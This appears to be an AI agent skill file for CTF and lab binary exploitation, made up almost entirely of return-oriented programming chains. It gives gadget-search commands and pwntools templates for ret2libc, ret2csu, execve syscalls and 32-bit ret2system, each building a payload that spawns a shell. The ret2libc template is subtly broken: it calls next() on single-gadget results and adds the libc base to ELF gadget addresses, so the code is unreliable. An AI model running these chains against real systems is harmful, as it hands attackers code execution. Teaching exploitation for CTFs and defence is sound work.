---
name: pwn-rop
description: >
  Return-Oriented Programming (ROP) chain construction. Use when binary has
  NX enabled and requires code reuse for exploitation. Covers basic ROP,
  ret2libc, ret2csu, ROPgadget/ropper usage, and chain automation.
tags: [pwn, rop, ret2libc, code-reuse, gadgets]
environment: [ctf, lab]
budget:
  max_attempts: 5
  stuck_threshold: 3
  time_hint: "45m"
  on_stuck: escalate
  stop_conditions:
    - "gadget chain incomplete for goal"
    - "leak+reentry loop fails twice"
    - "stack alignment unresolved after standard fixes"
---

# ROP Chain Construction

## Quick Reference

### ROPgadget Commands
```bash
ROPgadget --binary ./binary --ropchain                    # Auto generate chain
ROPgadget --binary ./binary --only "pop|ret" | grep rdi  # Pop rdi gadget
ROPgadget --binary ./binary --only "pop|ret" | grep rsi  # Pop rsi gadget
ROPgadget --binary ./binary --only "pop|ret" | grep rdx  # Pop rdx gadget
ROPgadget --binary ./binary --search "/bin/sh"           # String search
ROPgadget --binary ./binary --only "syscall|ret"        # Syscall gadgets
ROPgadget --binary ./binary --only "int 0x80"           # 32-bit syscall
```

### ropper Commands
```bash
ropper --file ./binary --search "pop rdi; ret"
ropper --file ./binary --search "pop rsi; ret"
ropper --file ./binary --search "pop rdx; ret"
ropper --file ./binary --search "syscall"
ropper --file ./binary --search "mov rdi, rsp"
```

## ret2libc Template

```python
from pwn import *

context.binary = elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process()

# Leak libc via puts
rop = ROP(elf)
offset = 72

payload = flat(
    b'A' * offset,
    rop.find_gadget(['pop rdi', 'ret'])[0],
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main']
)
p.sendline(payload)

puts_leak = u64(p.recvline().ljust(8, b'\x00'))
libc.address = puts_leak - libc.sym['puts']

# Shell
ret = libc.address + next(rop.find_gadget(['ret']))
pop_rdi = libc.address + next(rop.find_gadget(['pop rdi', 'ret']))
bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']

payload = flat(
    b'A' * offset,
    ret,           # Stack alignment
    pop_rdi,
    bin_sh,
    system
)
p.sendline(payload)
p.interactive()
```

## ret2csu

```python
csu_init_addr = elf.sym['__libc_csu_init']
csu_gadget1 = csu_init_addr + 65
csu_gadget2 = csu_init_addr + 83

def ret2csu(func_ptr, rdi, rsi, rdx):
    return flat(
        csu_gadget1,
        0,  # rbx
        1,  # rbp (rbx+1 == rbp)
        func_ptr - 8,  # r12
        rdi,
        rsi,
        rdx,
        csu_gadget2,
        b'A' * 56,
    )
```

## execve via syscall

```python
rop = ROP(elf)
payload = flat(
    b'A' * offset,
    rop.find_gadget(['pop rax', 'ret'])[0],
    59,  # execve
    rop.find_gadget(['pop rdi', 'ret'])[0],
    next(elf.search(b'/bin/sh\x00')),
    rop.find_gadget(['pop rsi', 'ret'])[0],
    0,
    rop.find_gadget(['pop rdx', 'ret'])[0],
    0,
    rop.find_gadget(['syscall', 'ret'])[0],
)
```

## Stack Alignment

```python
# x86-64 needs stack alignment before libc calls
ret = rop.find_gadget(['ret'])[0]
payload = flat(b'A' * offset, ret, pop_rdi, bin_sh, system)
```

## 32-bit ret2system

```python
payload = flat(
    b'A' * offset,
    elf.plt['system'],
    0xdeadbeef,
    next(elf.search(b'/bin/sh\x00')),
)
```

## References
- `references/rop-chains.md` - Advanced ROP techniques
- `references/ret2libc.md` - ret2libc in depth
